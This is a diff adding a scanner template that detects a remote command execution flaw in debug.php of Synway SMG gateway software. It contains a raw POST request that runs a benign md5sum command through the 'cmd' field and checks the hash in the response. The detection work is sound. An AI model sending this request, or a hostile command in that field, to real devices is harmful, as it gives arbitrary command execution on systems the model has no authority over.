@@ -1,0 +1,38 @@
+id: synway-smg-command-execution
+info:
+  name: Synway SMG Gateway Management Software Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Synway SMG Gateway Management Software has a remote command execution vulnerability in the debug.php file, allowing arbitrary command execution by attackers.
+  reference:
+    - https://www.synway.cn
+  tags: command-execution
+http:
+  - raw:
+      - |
+        POST /debug.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+
+        ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+        Content-Disposition: form-data; name="comdtype"
+
+        1
+        ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+        Content-Disposition: form-data; name="cmd"
+
+        echo -n 'hello'|md5sum|cut -d ' ' -f1
+        ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+        Content-Disposition: form-data; name="run"
+
+        ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "5d41402abc4b2a76b9719d911017c592"
+        part: body
